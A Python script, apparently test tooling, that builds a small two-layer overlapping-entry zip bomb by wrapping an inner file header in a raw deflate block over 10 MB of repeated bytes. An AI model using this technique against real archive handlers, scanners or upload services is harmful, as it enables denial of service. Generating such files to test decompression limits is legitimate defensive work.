# add to path the shared functions
import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from shared.commons import *

# Creates a small zip bomb with two layers
# Return: bytearray
def create_zip_bomb():
    uncompressed_data = b"A"*10000000
    # file1.txt should contain uncompressed_data when unzipped.
    # prepare the zip binary content in zip_file_data

    # compress the kernel data once
    compressed_data, comp_size, uncomp_size = compress_data(uncompressed_data)
    crc = zlib.crc32(uncompressed_data) & 0xffffffff

    # create the inner local file header for file1
    lfh1 = create_lfh("file1.txt", comp_size, uncomp_size, crc)

    # wrap lfh1 inside a non-compressed block so the outer file
    # treats it as raw uncompressed bytes during decompression
    ncb = create_non_compressed_block(len(lfh1))

    # the outer file's compressed stream = ncb + lfh1 + compressed kernel
    comp_size_outer = len(ncb) + len(lfh1) + comp_size
    uncomp_size_outer = len(lfh1) + uncomp_size
    crc_outer = zlib.crc32(lfh1 + uncompressed_data) & 0xffffffff
    lfh_outer = create_lfh("file2.txt", comp_size_outer, uncomp_size_outer, crc_outer)

    # assemble the zip file
    zip_file_data = bytearray()

    # outer LFH at offset 0
    zip_file_data.extend(lfh_outer)

    # non-compressed block header + inner LFH + compressed data
    zip_file_data.extend(ncb)
    lfh1_offset = len(zip_file_data)
    zip_file_data.extend(lfh1)
    zip_file_data.extend(compressed_data)

    # central directory
    central_dir = bytearray()
    cd_offset = len(zip_file_data)

    cdh1 = create_cdh("file1.txt", crc, comp_size, uncomp_size, lfh1_offset)
    cdh2 = create_cdh("file2.txt", crc_outer, comp_size_outer, uncomp_size_outer, 0)
    central_dir.extend(cdh1)
    central_dir.extend(cdh2)
    zip_file_data.extend(central_dir)

    # end of central directory
    eocd = create_eocd(len(central_dir), cd_offset, 2)
    zip_file_data.extend(eocd)

    with open("zip_bomb.zip", "wb") as f:
        f.write(zip_file_data)

if __name__ == "__main__":
    zip_bomb_data = create_zip_bomb()
